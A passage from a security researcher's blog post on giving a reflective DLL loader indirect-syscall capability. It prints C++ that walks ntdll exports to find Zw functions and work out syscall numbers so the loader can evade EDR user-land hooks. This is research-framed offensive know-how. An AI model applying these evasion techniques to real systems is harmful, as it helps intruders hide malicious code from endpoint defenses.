<html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="ie=edge"><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name="author" content=""><meta name="description" content="Ciao World, since I can’t get enough of playing around with the Reflective DLL that inspired the very first blog during the Christmas Holiday, after the YOLO Loader I decided to grant the little nasty DLL a new super-power: Indirect syscalls
So what I will be addressing here is:
Indirect syscall: why and (mostly) references SSN enum and PIC challenges 1 tb of MASM Disclaimer I write code and implement techniques for research and learning purposes only."><meta name="keywords" content=",untagged"><meta name="robots" content="noodp"><meta name="theme-color" content=""><link rel="canonical" href="https://oldboy21.github.io/posts/2024/02/reflective-dll-got-indirect-syscall-skills/"><title>Reflective DLL got Indirect Syscall skills :: Vincenzo — Blog
</title><link rel="stylesheet" href="https://oldboy21.github.io/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE="><link rel="apple-touch-icon" sizes="180x180" href="https://oldboy21.github.io/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="https://oldboy21.github.io/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="https://oldboy21.github.io/favicon-16x16.png"><link rel="manifest" href="https://oldboy21.github.io/site.webmanifest"><link rel="mask-icon" href="https://oldboy21.github.io/safari-pinned-tab.svg" color=""><link rel="shortcut icon" href="https://oldboy21.github.io/favicon.ico"><meta name="msapplication-TileColor" content=""><meta itemprop="name" content="Reflective DLL got Indirect Syscall skills"><meta itemprop="description" content="Ciao World, since I can’t get enough of playing around with the Reflective DLL that inspired the very first blog during the Christmas Holiday, after the YOLO Loader I decided to grant the little nasty DLL a new super-power: Indirect syscalls
So what I will be addressing here is:
Indirect syscall: why and (mostly) references SSN enum and PIC challenges 1 tb of MASM Disclaimer I write code and implement techniques for research and learning purposes only."><meta itemprop="datePublished" content="2024-02-12T18:45:29+01:00"><meta itemprop="dateModified" content="2024-02-12T18:45:29+01:00"><meta itemprop="wordCount" content="3331"><meta itemprop="image" content="https://oldboy21.github.io/"><meta itemprop="keywords" content="untagged,"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://oldboy21.github.io/"><meta name="twitter:title" content="Reflective DLL got Indirect Syscall skills"><meta name="twitter:description" content="Ciao World, since I can’t get enough of playing around with the Reflective DLL that inspired the very first blog during the Christmas Holiday, after the YOLO Loader I decided to grant the little nasty DLL a new super-power: Indirect syscalls
So what I will be addressing here is:
Indirect syscall: why and (mostly) references SSN enum and PIC challenges 1 tb of MASM Disclaimer I write code and implement techniques for research and learning purposes only."><meta property="article:published_time" content="2024-02-12 18:45:29 +0100 +0100"></head><body><div class="container"><header class="header"><span class="header__inner"><a href="https://oldboy21.github.io/" style="text-decoration:none"><div class="logo"><span class="logo__mark">&gt;</span>
<span class="logo__text">$ su - oldboy21</span>
<span class="logo__cursor" style="animation-duration:2s"></span></div></a><span class="header__right"><nav class="menu"><ul class="menu__inner"><li><a href="https://oldboy21.github.io/about/">About</a></li><li><a href="https://oldboy21.github.io/posts/">Posts</a></li></ul></nav><span class="menu-trigger hidden"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></svg></span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"></path></svg></span></span></span></header><div class="content"><main class="post"><div class="post-info"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>16 minutes</p></div><article><h1 class="post-title"><a href="https://oldboy21.github.io/posts/2024/02/reflective-dll-got-indirect-syscall-skills/">Reflective DLL got Indirect Syscall skills</a></h1><div class="post-content"><p><img src="https://oldboy21.github.io/dllsyscalls/Untitled.jpeg" alt="Untitled"></p><p>Ciao World, since I can’t get enough of playing around with the Reflective DLL that inspired the very first blog during the Christmas Holiday, after the <a href="https://oldboy21.github.io/posts/2024/01/yolo-you-only-load-once/">YOLO Loader</a> I decided to grant the little nasty DLL a new super-power: <strong>Indirect syscalls</strong></p><img src="https://media1.giphy.com/media/7JO6BhBHo67WKYXfAO/giphy.gif?cid=7941fdc6xcjd63nkqoczj2yl0oantzlwia2pr7ea2ml4kqdz&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" class="center" alt="animated"><p>So what I will be addressing here is:</p><ul><li>Indirect syscall: why and (mostly) references</li><li>SSN enum and PIC challenges</li><li>1 tb of MASM</li></ul><h2 id="disclaimer">Disclaimer</h2><p>I write code and implement techniques for research and learning purposes only. Not trying to claim anything, just humbly sharing knowledge, experiences and code 😀 feel always free to reach out for any doubts or question.</p><h1 id="indirect-syscalls">Indirect Syscalls</h1><p>As I mentioned when I published my little <a href="https://github.com/oldboy21/SyscallMeMaybe">POC</a> using indirect syscalls to pop a calc.exe, there are already looots of resources that explain pretty well the theory behind user-land hooks and direct/indirect syscall technique. I will make a nice list at the end of this section for you but for now I will just try to give a little introduction to the topic.</p><h3 id="the-problem">The Problem</h3><p>Not only my Reflective DLL gets new skills, also EDRs do. One of the few things that in the past years has been annoying the Red Teamers (and hopefully the so-called bad guys) is <strong>UserLand-Hooks.</strong></p><p>Some of the Win32 APIs needs to politely step into kernel-mode in order to achieve what they want. Among these we have <strong>VirtualAlloc, ReadFile, WriteFile, etc.</strong> The gate to the kernel world is the syscall instruction (within ntdll.dll).</p><p>While the execution flow of our process is transitioning between <a href="https://learn.microsoft.com/nl-nl/windows-hardware/drivers/gettingstarted/user-mode-and-kernel-mode">user-mode and kernel-mode</a> the EDR is able to put itself in between and check what are the intentions of the APIs before letting the execution move forward.</p><p>Someone once said I am good with metaphor or examples so:</p><img src="https://oldboy21.github.io/dllsyscalls/Untitled%201.jpeg" class="center"><p><em>Imagine you are a really suspicious API (e.g. VirtualAlloc) that is about to take a flight to somewhere warm (which is the beautiful kernel-mode). So you walk into the airport and before stepping into the aircraft (which in this example is the syscall) you meet the EDR wearing clothes of Airport security. What the EDR wants to do before letting you jump on the aircraft is to check your luggage. As Win32 API you act bit surprised and say: I just have a LPVOID, couple of DWORD and a SIZE_T, check_in desk said it was allowed. Still the EDR opens your bags and decides whether you planning to do something nasty:</em> <strong>User-land hooks.</strong></p><h3 id="the-solution">The Solution</h3><p>Basing on the little story above:</p><p><strong>Direct syscalls:</strong> You buy your own aircraft, aka you implement few assembly instructions to execute the syscall from within the process.</p><p><strong>Indirect-syscall:</strong> You jump the fence at the airport and you just board as the other passengers bypassing the airport security, aka you build a little assembly stub to jump to the syscall instruction within ntdll.dll.</p><h3 id="the-resources">The Resources</h3><p>I hope that at least I made you laugh a bit and you also have an idea of what I am trying to achieve here. As promised a list of GREAT resources to learn more about direct/indirect syscalls:</p><ul><li><a href="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls">Direct Syscalls vs Indirect Syscalls</a> by <a href="https://twitter.com/VirtualAllocEx">@VirtualAllocEx</a></li><li><a href="https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low">Direct Syscalls: A journey from high to low</a> by <a href="https://twitter.com/VirtualAllocEx">@VirtualAllocEx</a></li><li><a href="https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/#user-mode-vs-kernel-mode">Retrieving Syscall ID with Hell’s Gate, Halo’s Gate, FreshyCalls and Syswhispers2</a> by Alice Climent-Pommeret</li><li><a href="https://www.ired.team/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs">Calling Syscalls Directly from Visual Studio to Bypass AVs/EDRs</a> by <a href="https://twitter.com/spotheplanet">spotheplanet</a></li><li><a href="https://www.outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">Combining Direct System Calls and sRDI to bypass AV/EDR</a> by <a href="https://www.outflank.nl/blog/author/cornelis/">Cornelis</a></li></ul><p>And many more. Most of them do refer to really interesting others so this list is definitely a good start to dive deeper into the topic.</p><h1 id="reflective-dll-bypassing-airport-security">Reflective DLL bypassing Airport Security</h1><p>Now that we have an idea of what this “indirect syscall” super power is, why would it be nice to grant it to my Reflective DLL?</p><p>Well as I mentioned <a href="https://oldboy21.github.io/posts/2023/12/all-i-want-for-christmas-is-reflective-dll-injection/">here</a> in order to work properly the Reflective DLL has to perform all the loading tasks to load itself into the memory of the target process. These loading tasks also entail the use of VirtualAlloc and VirtualProtect Win32 APIs which are among those that gets hooked and inspected by the EDRs. Therefore indirect syscall capabilities would definitely help the Reflective DLL to be more stealth during and after the loading process 😊</p><h3 id="retrieving-ssns">Retrieving SSNs</h3><p>Since you have read all the suggested references above you know that the first two instructions of the syscall stub we have to implement look like this:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-nasm"><code class=" language-nasm" data-lang="nasm">mov r10, rcx
mov eax, 18 ;example SSN
...
</code></pre><div class="toolbar"><div class="toolbar-item"><span>NASM</span></div></div></div></div><p>The value that is moved within the EAX register is a (system service number) SSN, which is a unique function identifier. Those identifier change across the different Windows versions/builds, hence one of the challenges for who wanted to implement user-land hooking bypass via direct/indirect syscalls has always been the enumeration of these SSNs. The idea is to do that at run-time, as it can be way more solid approach than hardcoding SSN basing on the target OS version.</p><p>Different techniques have been explored for the runtime SSN enumeration task:</p><ul><li><a href="https://github.com/am0nsec/HellsGate">Hell’s Gate</a></li><li><a href="https://blog.sektor7.net/#!res/2021/halosgate.md">Halo’s Gate</a></li><li><a href="https://github.com/crummie5/FreshyCalls">FreshyCalls</a></li><li><a href="https://github.com/jthuraisamy/SysWhispers2">Syswhispers2</a></li><li><a href="https://github.com/klezVirus/SysWhispers3">Syswhispers3</a></li><li><a href="https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/#user-mode-vs-kernel-mode">Nice overview of those mentioned above</a></li></ul><p>I liked them all ❤️ however I have found inspiration only looking at the latest syswhisper3 techniques and FreshyCalls. An interesting read that definitely motived my approach was the article by Klezvirus: <a href="https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/">https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/</a></p><p>In the end what I have decided to implement was a Position Indipendent Code that would retrieve the address of all the <strong>Zw</strong> functions within the DLL and sort them by address, finally retrieve the needed amount of pseudo-random addresses pointing to syscall/ret instructions to fake the function the reflective DLL is invoking at execution time (e.g. invoking VirtualAlloc via syscall/ret instruction found in the implementation of ZwAccessCheck).</p><img src="https://media1.giphy.com/media/1ziiQ8TVfLgeGWUOFx/giphy.gif?cid=7941fdc6y1pf1309dgcpgkkrjqwgvmqstfjenwu1qphvue9p&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" class="center" alt="animated"><p>A position dependent version of the code I want to implement can be found in my repo <a href="https://github.com/oldboy21/SyscallMeMaybe/blob/3f5c9704cf88f209c8b9e27d9c3ab02aa472707b/SyscallMeMaybe/SyscallMeMaybe.cpp#L133">here</a> 🙂</p><p>Given the fact I had already played around with indirect syscalls, I had already in mind what the position independent version of that code would look like and the challenges that I would have had (and now I wish I did):</p><ul><li>Lack of structures like unordered_map and functions like sort()</li><li>Inability to generate pseudo-random numbers</li><li>Global variable to refer from MASM syscall stub</li></ul><p>There was also a little challenge hidden (of course) that popped up during development but let’s just jump into the code.</p><p>First things first, I had defined a little structure that would hold the SSN, syscall/ret address and Function address of the syscalls I wanted to invoke:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_SYSCALL_ENTRY</span> <span class="token punctuation">{</span>

    FARPROC funcAddr<span class="token punctuation">;</span>
    PBYTE sysretAddr<span class="token punctuation">;</span>
    <span class="token keyword">int</span> SSN<span class="token punctuation">;</span>

<span class="token punctuation">}</span> SYSCALL_ENTRY<span class="token punctuation">,</span> <span class="token operator">*</span> PSYSCALL_ENTRY<span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>After that I have defined a new function that would take as input the HANDLE to the NTDLL module and a pointer to a SYSCALL_ENTRY structure defined within the ReflectiveFunction that would hold <strong>the results of the SSN enumeration</strong>. The first task of this function is to parse the EAT of the NTDLL.DLL module and match all the functions that starts with “<strong>Zw</strong>”. Let’s take a look a the snippet taking care of this task:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp"><span class="token keyword">void</span> <span class="token function">RetrieveZwFunctions</span><span class="token punctuation">(</span>IN HMODULE hModule<span class="token punctuation">,</span> IN PSYSCALL_ENTRY syscalls<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    PBYTE pBase <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>hModule<span class="token punctuation">;</span>

    PIMAGE_DOS_HEADER pImgDosHdr <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pBase<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pImgDosHdr<span class="token operator">-&gt;</span>e_magic <span class="token operator">!=</span> IMAGE_DOS_SIGNATURE<span class="token punctuation">)</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>

    PIMAGE_NT_HEADERS pImgNtHdrs <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgDosHdr<span class="token operator">-&gt;</span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pImgNtHdrs<span class="token operator">-&gt;</span>Signature <span class="token operator">!=</span> IMAGE_NT_SIGNATURE<span class="token punctuation">)</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>

    IMAGE_OPTIONAL_HEADER ImgOptHdr <span class="token operator">=</span> pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">;</span>
    PIMAGE_EXPORT_DIRECTORY pImgExportDir <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> ImgOptHdr<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>

    PDWORD FunctionNameArray <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span>
    PDWORD FunctionAddressArray <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span>
    PWORD  FunctionOrdinalArray <span class="token operator">=</span> <span class="token punctuation">(</span>PWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfNameOrdinals<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//variables for syscall che bello stackstring</span>
    CHAR zw<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Z'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    CHAR ZwAllocateVirtualMemory<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'\0'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    CHAR ZwProtectVirtualMemory<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'\0'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    CHAR ZwFlushInstructionCache<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Z'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'I'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'\0'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> zwCounter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> syscallEntries <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    DWORD syscallHalf<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    PBYTE functionAddress <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    uintptr_t addressValue <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    DWORD baseAddress <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>
    DWORD temp <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>

    <span class="token comment">// looping through all the exported functions</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pImgExportDir<span class="token operator">-&gt;</span>NumberOfFunctions<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">//function name </span>
        CHAR<span class="token operator">*</span> pFunctionName <span class="token operator">=</span> <span class="token punctuation">(</span>CHAR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> FunctionNameArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// new custom compare string that takes as parameter the number of chars to match</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ComprareNStringASCII</span><span class="token punctuation">(</span>zw<span class="token punctuation">,</span> pFunctionName<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            functionAddress <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> FunctionAddressArray<span class="token punctuation">[</span>FunctionOrdinalArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//here i have to fill the struct with function names, address of syscall/ret and ssn</span>
            addressValue <span class="token operator">=</span> <span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>functionAddress<span class="token punctuation">;</span>
            syscallHalf<span class="token punctuation">[</span>zwCounter<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span> <span class="token punctuation">(</span>addressValue <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            zwCounter<span class="token operator">++</span><span class="token punctuation">;</span>
         
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ComprareStringASCII</span><span class="token punctuation">(</span>ZwAllocateVirtualMemory<span class="token punctuation">,</span> pFunctionName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">//retrieve the address in memory of the function we want to execute</span>
                <span class="token comment">//the other params of the SYSCALL_ENTRY struct are initialized to null for now</span>
                syscalls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">(</span>FARPROC<span class="token punctuation">)</span>functionAddress<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
                syscallEntries<span class="token operator">++</span><span class="token punctuation">;</span>
            
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ComprareStringASCII</span><span class="token punctuation">(</span>ZwProtectVirtualMemory<span class="token punctuation">,</span> pFunctionName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                
                syscalls<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">(</span>FARPROC<span class="token punctuation">)</span>functionAddress<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
                syscallEntries<span class="token operator">++</span><span class="token punctuation">;</span>
            
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ComprareStringASCII</span><span class="token punctuation">(</span>ZwFlushInstructionCache<span class="token punctuation">,</span> pFunctionName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                syscalls<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">(</span>FARPROC<span class="token punctuation">)</span>functionAddress<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
                syscallEntries<span class="token operator">++</span><span class="token punctuation">;</span>

            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        
    <span class="token punctuation">}</span>

<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>Nothing too crazy, since this is basically what we saw in the previous blogs as well. However, before moving forward, something to pay double attention to is:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp">DWORD syscallHalf<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment">//array of DWORD called syscallHalf</span>
<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
functionAddress <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> FunctionAddressArray<span class="token punctuation">[</span>FunctionOrdinalArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
addressValue <span class="token operator">=</span> <span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>functionAddress<span class="token punctuation">;</span>
syscallHalf<span class="token punctuation">[</span>zwCounter<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span> <span class="token punctuation">(</span>addressValue <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//saving the function address excluding 4 bytes</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>These lines above are about the unexpected challenge I mentioned before, because as we all know on 64-bit systems a DWORD is not big enough to hold a memory address. So why would I instead just cut the address in half and save it in a DWORD array?</p><img src="https://oldboy21.github.io/dllsyscalls/Untitled.png" class="center"><p>At first I thought I had messed up some imports or external references and started to blame my laziness and lack of order in the things I do, but apparently I was wrong 😌</p><p>and those three errors are related to <strong>filling up the stack space</strong></p><img src="https://media4.giphy.com/media/JwVWLRnZkh2M0/giphy.gif?cid=7941fdc66eeci78xnqv7kns5vsytppxx4q6bd4qz436f5bv9&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" class="center" alt="animated"><p>After looking little around I have found that:</p><img src="https://oldboy21.github.io/dllsyscalls/Untitled%201.png" class="center"><p>And that made <strong>a lot of sense</strong> all of a sudden, being position independent code it has to rely on stack variables and since my idea was to grab all the <strong>Zw</strong> functions and sort them to figure the SSNs, I was making use of way too much memory on the stack. Annoying, but despite the other techniques for SSN retrieval (Hell’s Gate, …) would have solved this problem, I decided to give it an extra thought.</p><p>At first I had tried just to change the linker options so that I could increase the reserved space for the stack manipulating the <a href="https://learn.microsoft.com/en-us/cpp/build/reference/stack-stack-allocations?view=msvc-170">/STACK linker option</a> to realize pretty quickly that of course</p><img src="https://oldboy21.github.io/dllsyscalls/Untitled%202.png" class="center"><p>But then I thought: why do I need the full address when I can just sort basing on the 4 least significant bytes of the memory address? 🙀</p><p>Being inside the limited space of the virtual space of a single process and being just the memory space allocated for a single module in memory, what I am thinking should work:</p><img src="https://oldboy21.github.io/dllsyscalls/Untitled%203.png" class="center"><p>As soon as 